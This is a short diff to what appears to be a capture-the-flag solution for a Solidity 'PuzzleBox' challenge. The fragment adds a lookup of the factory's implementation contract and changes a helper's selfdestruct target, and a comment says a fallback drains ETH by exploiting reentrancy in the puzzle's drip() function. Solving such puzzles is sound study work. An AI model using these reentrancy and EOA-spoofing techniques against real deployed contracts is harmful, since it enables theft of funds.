@@ -9,6 +9,7 @@ contract PuzzleBoxSolution {
         
         address proxy = address(puzzle);
         address factory = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
+        address impl = PuzzleBoxFactory(factory).logic();
 
         EoaSpoof eoaSpoof = new EoaSpoof(puzzle);
         eoaSpoof.reenterDrip();
@@ -63,7 +64,7 @@ contract EoaSpoof {
     }
 
     function destro() external {
-        selfdestruct(payable(address(puzzle)));
+        selfdestruct(payable(address(msg.sender)));
     }
 
     // fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
